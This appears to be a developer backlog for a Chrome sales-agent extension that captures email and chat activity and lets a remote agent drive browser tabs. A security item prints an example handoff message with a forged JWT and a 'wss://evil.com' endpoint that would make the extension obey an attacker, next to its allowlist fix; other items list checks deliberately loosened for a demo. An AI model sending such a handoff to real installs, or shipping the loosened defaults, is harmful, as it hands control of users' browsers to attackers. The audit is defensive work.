# Crema Sales Agent — TODO

Living backlog. Priority order: get the prototype working end-to-end, then harden, then publish.

---

## Ambient capture (shipped 2026-05-20 — protocol v0.2)

Three-phase build landing the marketing site's "ambient capture / always in
control" pillars. The extension now *observes* comms surfaces, not just drives.

- **Phase A** ✅ — popup control surface (`src/popup/`), 3-state toolbar
  indicator (idle/recording/driving) in `toggle.ts`, per-site allow-list in
  `src/background/sites.ts`.
- **Phase B** ✅ — content-script adapters (`src/content/`) for Gmail,
  Outlook-web, LinkedIn, Teams-web; `activity_event` emit → service worker.
- **Phase C** ✅ — `RepExtension` DO ingests `activity_event` → CRM activity
  row (backend repo).
- **Network intent router** ✅ (2026-05-22) — `chrome.webRequest`-based
  capture in the service worker (`src/background/net-capture.ts`) matched
  against declarative, hot-reloadable `CaptureRule`s
  (`src/background/capture-rules.ts`). Primary capture path; DOM adapters
  demoted to fallback. Both converge on `forwardActivityEvent` in `index.ts`,
  which coalesces the two sources so a Send logs once. Added `webRequest`
  permission. Protocol frame unchanged — no version bump.

### A1 — Capture rules + adapter selectors need a live-session tuning pass 🟡 demo-critical

Two best-effort/demo-grade layers, both expected to miss on real traffic until
tuned against a live signed-in session (drive a real tab with the `interceptor`
CLI):

1. **Capture rules** (`src/background/capture-rules.ts` `DEFAULT_RULES`) — the
   `match`/`extract` values are reasoned from each vendor's known API shape but
   NOT validated. A rule that matches a request but extracts nothing logs
   `rule '<id>' matched ... but extraction was empty` — that warning is the
   tuning checklist: inspect the real request body, fix the `FieldSpec` paths.
2. **DOM adapter selectors** (`src/content/adapters/*`) — the fallback layer;
   same caveat as before.

A miss in either degrades to no-emit (non-fatal), but the demo won't capture
much until at least one layer is tuned per site. The capture rules are the
better investment — API endpoints churn slower than the DOM.

### A4 — Self-healing capture rules (protocol v0.3) 🟢 next

The infra for hot-reloading rules exists (`captureRules` storage override +
`storage.onChanged`). Close the loop: on an "extraction empty" miss, upload a
redacted request sample to the DO; the agent emits a patched rule; the DO
pushes it fleet-wide via a new `capture_rule_update` frame. Reuses the
`site-adapters.ts` discovery pattern. See the design notes in chat history.

### A2 — Verify Outlook-web `email_received` sender extraction 🟡

Outlook's message-list row has no stable sender element; the adapter falls
back to regex-scanning `aria-label`. Confirm against a live mailbox.

### A3 — Richer commands for the autonomous "build a hit list" beat 🟢

Pillar 2 ("hand it the keys") still leans on navigate/click/type. Consider
adding `scroll`, `wait_for_selector`, and an accessibility-tree snapshot.

---

## Security (deferred — fix before any non-dev install)

### S0 — Demo loosening: re-tighten before CWS publish 🟡 partially reverted (2026-05-21)

Loosened on 2026-05-19 for demo / iteration. Search `TODO(sec)` to find every
loosened check. The two network-trust loosenings (S0d, S0e) were re-tightened
on 2026-05-21 ahead of going public; the three cosmetic ones (S0a–S0c) remain
loosened until CWS publish so first-install UX still demos clean.

| Where                                     | What was loosened                                                                                | Status                                                                     |
| ----------------------------------------- | ------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------- |
| `src/background/toggle.ts` `getEnabled`   | Unset `agentEnabled` now returns `true` (was `false`). Master switch defaults ON.                | 🟡 still loose. Flip back to `=== true` before CWS publish.                |
| `src/background/index.ts` (boot)          | Paints `applyVisualState(true)` synchronously before storage read to hide grey→green flicker.    | 🟡 still loose. Drop the optimistic paint when S0a is reverted.            |
| `manifest.json` action icon + title       | Cold-boot icon/title now show "ON" so a fresh install matches the storage default.               | 🟡 still loose. Revert to `agent-off-128.png` / "Crema Agent (OFF)".       |
| `src/background/validate.ts` baseUrl list | Pattern allowlist accepted any `wss://*.workers.dev`.                                            | ✅ DONE 2026-05-21. Replaced with exact-match `Set` (smashlabs prod host) plus `*.cremasales.com`. |
| `manifest.json` `externally_connectable`  | Was widened to lovableproject.com / lovable.dev / workers.dev / 127.0.0.1 during demo iteration. | ✅ DONE. Already narrowed to `https://cremasales.com/*`, `https://*.cremasales.com/*`, `http://localhost:*/*`. |

### S1 — `baseUrl` is attacker-controlled in `agent_handoff` ✅ DONE

`src/background/index.ts:70-98` accepts whatever `baseUrl` the website sends. XSS or supply-chain compromise on **any** path under `cremasales.com` can trigger:

```js
chrome.runtime.sendMessage(EXTENSION_ID, {
  type: "agent_handoff",
  repId: "victim",
  jwt: "<attacker_minted>",
  baseUrl: "wss://evil.com",
});
```

→ extension persists, dials evil.com, executes attacker commands once toggle is ON.

**Fix:** hardcode an allowlist:
```ts
const ALLOWED_BASE_URLS = new Set([
  "wss://api.cremasales.com",
  "ws://localhost:8787",
]);
if (!ALLOWED_BASE_URLS.has(baseUrl)) {
  sendResponse({ ok: false, error: "baseUrl_not_allowed" });
  return;
}
```

### S2 — `onMessageExternal` doesn't verify `sender.origin` ✅ DONE

Implemented 2026-05-21 in `src/background/index.ts`. `ALLOWED_HANDOFF_ORIGINS` regex list (`https://cremasales.com`, `https://*.cremasales.com`, `http://localhost[:port]`) is checked before any payload inspection; mismatches reply `{ok:false, error:"untrusted_origin"}`.

### S3 — No JWT structural sanity check ✅ DONE

Implemented 2026-05-21 in `src/background/index.ts`. `JWT_SHAPE = /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/` rejects obviously-malformed tokens before they're stored. Signature still isn't verified (no secret on the client) but garbage is filtered.

### S4 — Narrow `externally_connectable.matches`

Currently `https://cremasales.com/*`. If only `/extension/onboard` should be calling, tighten to `https://cremasales.com/extension/*` in `manifest.json:28-30`.

### S5 — Server-side JWT hygiene (out of scope for this repo)

Coordinate with the backend agent (`extension-backend` worktree):
- Short `exp` (target: 1h)
- Refresh via the same `agent_handoff` channel
- Revoke on logout
- Don't log full JWTs in Worker / DO logs

---

## Functional bugs (some demo-critical)

### F1 — Listeners attached inside async IIFE 🟡 mild

`src/background/index.ts:30-34` registers `chrome.action.onClicked` inside `void (async () => …)()`. MV3 wants top-level synchronous registration so listeners survive SW restarts. In practice the SW re-runs the whole script on wake, so toolbar clicks still work, but it's an antipattern that could race a click in the first few ms of cold boot.

**Fix:** call `attachToggleListener(socket)` at top level; keep the `applyVisualState` + `socket.connect()` calls inside the async block.

### F2 — `type` command inconsistent between DOM and CDP modes 🔴 demo-critical

`src/background/dispatch.ts:176-219`:
- DOM mode uses the `value` setter, which **replaces** the input value.
- CDP mode (`typeViaCdp` at L285-301) **appends** to the existing value (just dispatches key events).

Reps will hit this. Add a `clear?: boolean` param (default `true`) and have CDP mode send a `Ctrl+A` / `Delete` sequence first when `clear` is true.

### F3 — CDP attach/detach per command 🟡 UX

`src/background/dispatch.ts:267-300` flashes the "Chrome is being controlled by debugger" infobar every command. Ten clicks = ten flashes.

**Fix:** pool the attach over an idle window (e.g. 60s); detach lazily after no CDP traffic for that period.

### F4 — Snapshot caps by char count, not byte count 🟢 minor

`src/background/dispatch.ts:231-233`: `html.slice(0, cap)` slices UTF-16 chars. Spec says `max_bytes`. UTF-8 over the wire is 1-4x. Encode then slice:
```ts
const bytes = new TextEncoder().encode(html);
const out = bytes.length > cap
  ? new TextDecoder().decode(bytes.slice(0, cap))
  : html;
```

### F5 — Dead `pongWatchdog` field 🟢 cleanup

`src/background/ws-client.ts:30` declared and cleared in `stopHeartbeat`, never assigned. Delete the field and the cleanup line.

### F6 — Redundant `activeTab` permission 🟢 minor

`manifest.json:24` — redundant given `<all_urls>` host permission. Remove to keep CWS reviewer happy.

### F7 — No idempotency / replay protection ✅ DONE

Implemented in `src/background/dedup.ts` — LRU of 256 acked command IDs; on replay we re-send the cached response without re-executing. SW-lifetime only.

### F8 — Backoff doesn't reset until first message 🟢 minor

`src/background/ws-client.ts:96` resets `backoffStep` on `open`. A transient `open→close` cycle still walks the ladder. Acceptable for now.

---

## Cross-team dependencies (blockers for end-to-end demo)

### X1 — DO backend running 🔴 blocker

Sibling agent: `extension-backend` (worktree `44b9c6b8`).

The `RepAgent` Durable Object must handle `WSS /agents/:repId/ws`, validate JWT, register the hibernation `ping`/`pong` auto-response pair, persist the command queue, and accept `POST /agents/:repId/act`.

Without this, the extension just reconnects forever.

### X2 — Website handshake on cremasales.com 🔴 blocker for prod path

Frontend agent: `Lovable` (`725b8311`).

After rep login, the site needs to call:
```ts
chrome.runtime.sendMessage(EXTENSION_ID, {
  type: "agent_handoff",
  repId, jwt, baseUrl,
}, (resp) => { /* resp.ok === true */ });
```

For dev demo we can skip this and seed `chrome.storage.local` from the SW console directly.

### X3 — JWT issuance 🟡

Backend agent must mint HS256 tokens (`sub=repId`, short `exp`, signed with `JWT_SECRET`) at login. Out of scope for this repo.

---

## CWS publishing (deferred — won't block demo)

- [ ] Privacy policy hosted at `cremasales.com/privacy`
- [ ] Real icon artwork (replace solid-color PNGs); sizes 16, 32, 48, 128
- [ ] Listing screenshots: toolbar ON state, toolbar OFF state, a navigate-in-action shot
- [ ] Promotional 440×280 image
- [ ] Store description copy
- [ ] `minimum_chrome_version: "116"` in `manifest.json`
- [ ] `homepage_url` in `manifest.json`
- [ ] Paste permission justifications from README into the dev-dashboard form
- [ ] Plan for the 7-14 day CWS review (the `<all_urls>` + `debugger` combo gets manual review every time)

---

## Dev hygiene (deferred)

- [ ] Unit tests for `dispatch.ts` (mock `chrome.*` APIs)
- [ ] Integration test with a mock DO (fake `wss://` server in tests)
- [ ] GitHub Actions: typecheck + build on PR
- [x] Popup UI showing connection status, rep id, master switch, per-site
      allow-list (shipped Phase A — `src/popup/`). Still missing: a
      "disconnect & wipe credentials" button.
- [ ] Replace polling-based static-file copy in `scripts/build.ts:39` with esbuild plugin
